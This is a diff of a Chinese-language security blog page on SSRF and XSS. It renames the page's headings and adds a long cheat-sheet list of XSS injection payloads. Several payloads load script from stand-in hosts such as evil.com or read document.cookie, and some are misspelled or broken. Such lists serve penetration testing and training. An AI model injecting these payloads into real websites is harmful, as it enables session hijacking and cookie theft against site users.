@@ -42,7 +42,7 @@
     
     
       
-        <title>SSRF&XSS - windforce17's blog</title>
+        <title>XSS SSRF - windforce17's blog</title>
       
     
     
@@ -132,7 +132,7 @@
                 windforce17's blog
               </span>
               <span class="md-header-nav__topic">
-                SSRF&XSS
+                XSS SSRF
               </span>
             
           
@@ -441,30 +441,54 @@
     
     <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
     
-      
-    
     
       <label class="md-nav__link md-nav__link--active" for="__toc">
-        SSRF&XSS
+        XSS SSRF
       </label>
     
-    <a href="./" title="SSRF&XSS" class="md-nav__link md-nav__link--active">
-      SSRF&XSS
+    <a href="./" title="XSS SSRF" class="md-nav__link md-nav__link--active">
+      XSS SSRF
     </a>
     
       
 <nav class="md-nav md-nav--secondary">
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">目录</label>
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#ssrfxss" title="SSRF&amp;XSS" class="md-nav__link">
+    SSRF&amp;XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#payload" title="常用绕过 payload等" class="md-nav__link">
     常用绕过 payload等
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" title="XSS" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload_1" title="常见payload" class="md-nav__link">
+    常见payload
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="其他资料" class="md-nav__link">
+    其他资料
   </a>
   
 </li>
@@ -1765,15 +1789,41 @@
 <nav class="md-nav md-nav--secondary">
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">目录</label>
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#ssrfxss" title="SSRF&amp;XSS" class="md-nav__link">
+    SSRF&amp;XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#payload" title="常用绕过 payload等" class="md-nav__link">
     常用绕过 payload等
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xss" title="XSS" class="md-nav__link">
+    XSS
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload_1" title="常见payload" class="md-nav__link">
+    常见payload
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="其他资料" class="md-nav__link">
+    其他资料
   </a>
   
 </li>
@@ -1803,7 +1853,9 @@
                   <a href="https://github.com/Windforce17/blog/blob/master/docs/Web&Attack/XSS SSRF.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="ssrfxss">SSRF&amp;XSS<a class="headerlink" href="#ssrfxss" title="Permanent link">&para;</a></h1>
+                  <h1>XSS SSRF</h1>
+                
+                <h2 id="ssrfxss">SSRF&amp;XSS<a class="headerlink" href="#ssrfxss" title="Permanent link">&para;</a></h2>
 <p>SRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
 <p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
 <h2 id="payload">常用绕过 payload等<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h2>
@@ -1819,11 +1871,40 @@
 </pre></div>
 
 
-<h1 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h1>
+<h2 id="xss">XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h2>
 <h2 id="payload_1">常见payload<a class="headerlink" href="#payload_1" title="Permanent link">&para;</a></h2>
 <p><div class="codehilite"><pre><span></span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
 <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="mi">0</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span>
 <span class="s2">&quot;&gt;&lt;script src=http://www.xxx.com/1.js&gt;&lt;/script&gt;&quot;</span>
+<span class="s2">&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&gt;&lt;/script&gt;</span>
+<span class="s2">&lt;body onLoad=&quot;</span><span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">),</span><span class="s2">&quot;&gt;</span>
+<span class="s2">&quot;</span><span class="o">&gt;&lt;</span><span class="err">/tile&gt;&lt;script&gt;alert(1111)&lt;/script&gt;</span>
+<span class="o">&lt;</span><span class="err">/textarea&gt;&#39;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>
+<span class="s1">&#39;&quot;&quot;&gt;&lt;script language=&quot;JavaScript&quot;&gt; alert(&quot;X \nS \nS&quot;),&lt;/script&gt;</span>
+<span class="s1">&lt;/script&gt;&lt;/script&gt;&lt;&lt;&lt;&lt;script&gt;&lt;&gt;&gt;&gt;&gt;&lt;&lt;&lt;script&gt;alert(123)&lt;/script&gt;</span>
+<span class="s1">&lt;html&gt;&lt;noalert&gt;&lt;noscript&gt;(123)&lt;/noscript&gt;&lt;script&gt;(123)&lt;/script&gt;</span>
+<span class="s1">&lt;INPUTTYPE=&quot;IMAGE&quot;SRC=&quot;javasctipt:alert(&quot;XSS&quot;);&quot;&gt;</span>
+<span class="s1">&#39;</span><span class="o">&gt;&lt;</span><span class="err">/select&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span>
+<span class="s1">&#39;&gt;&#39;</span><span class="o">&gt;&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://www.evil.com/XSS.js&#39;</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
+<span class="p">}</span><span class="o">&lt;</span><span class="err">/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/XSS/.source));&lt;/script&gt;</span>
+<span class="o">&lt;</span><span class="nx">SCRIPT</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">);</span><span class="o">&lt;</span><span class="err">/SCRIPT&gt;</span>
+<span class="nx">a</span><span class="o">=</span><span class="s2">&quot;get&quot;</span><span class="p">;</span><span class="nx">b</span><span class="o">=</span><span class="s2">&quot;URL&quot;</span><span class="p">;</span><span class="nx">c</span><span class="o">=</span><span class="s2">&quot;javascript:&quot;</span><span class="p">;</span><span class="nx">d</span><span class="o">=</span><span class="s2">&quot;alert(&quot;</span><span class="nx">XSS</span><span class="s2">&quot;);&quot;</span><span class="p">;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">a</span><span class="o">+</span><span class="nx">b</span><span class="o">+</span><span class="nx">c</span><span class="o">+</span><span class="nx">d</span><span class="p">);</span>
+<span class="o">=</span><span class="s1">&#39;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span>
+<span class="s1">&lt;sctipt+src=&quot;&gt;&quot;+src=&quot;http://www.evil.com/XSS.js?68,69&quot;&gt;&lt;/script&gt;</span>
+<span class="s1">&lt;body backgroud=jabascript:&#39;</span><span class="s2">&quot;&gt;&lt;script&gt;alert(navigator.userAgent)&lt;/sctipt&gt;&gt;&lt;/body&gt;</span>
+<span class="s2">&quot;</span><span class="o">&gt;</span><span class="nx">XaDoS</span><span class="o">/&gt;&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script&gt;&lt;script src=&quot;http:/</span><span class="o">/</span><span class="nx">www</span><span class="p">.</span><span class="nx">site</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">X</span>
+<span class="nx">Data</span><span class="o">:</span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mi">7</span><span class="p">;</span><span class="nx">base64</span><span class="p">.</span><span class="nx">Ij481</span><span class="mf">.3</span><span class="nx">RpdGod</span><span class="p">[</span><span class="nx">jxzY3JpcHQ</span><span class="o">+</span><span class="nx">YWxlcnQoMIMzNy</span>
+<span class="s2">&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/XSS/)/&gt;</span>
+<span class="s2">&quot;</span><span class="o">&lt;</span><span class="nx">marquee</span><span class="o">&gt;&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">k</span> <span class="nx">onerror</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/XSS/</span><span class="p">)</span><span class="o">&gt;</span>
+<span class="s1">&#39;&quot;&gt;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/XSS/.source)/&gt;</span>
+<span class="s1">&lt;/div&gt;&lt;script&gt;alert(123)&lt;/script&gt;</span>
+<span class="s1">&quot;&gt;&lt;iframe src=&quot;javascript:alert(document.cookie)&#39;</span><span class="o">&gt;&lt;</span><span class="nx">iframe</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;backgroud:url(&quot;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="nx">I</span><span class="p">)</span><span class="err">&#39;</span><span class="p">)</span><span class="s2">&quot;&gt;</span>
+<span class="s2">&lt;img src=&quot;</span><span class="nx">java</span><span class="err">\</span><span class="nx">nascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="err">\</span><span class="s2">&quot;XSS\&quot;)&quot;</span><span class="o">&gt;</span>
+<span class="o">&gt;</span><span class="s2">&quot;&gt;&lt;img src=&quot;</span><span class="nx">javascript</span><span class="o">:</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">)</span><span class="s2">&quot;&gt;</span>
+<span class="s2">&quot;</span><span class="nx">style</span><span class="o">=</span><span class="s2">&quot;background:url(javascript:alert(/XSS/))&quot;</span>
+<span class="o">&gt;</span><span class="s2">&quot;&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;</span>
+<span class="s2">&quot;</span><span class="o">&gt;&lt;</span><span class="err">/title&gt;&lt;script&gt;alert(I)&lt;/script&gt;</span>
 </pre></div>
 反射XSS:欺骗用户点击，可能会被浏览器过滤</p>
 <h2 id="_1">其他资料<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
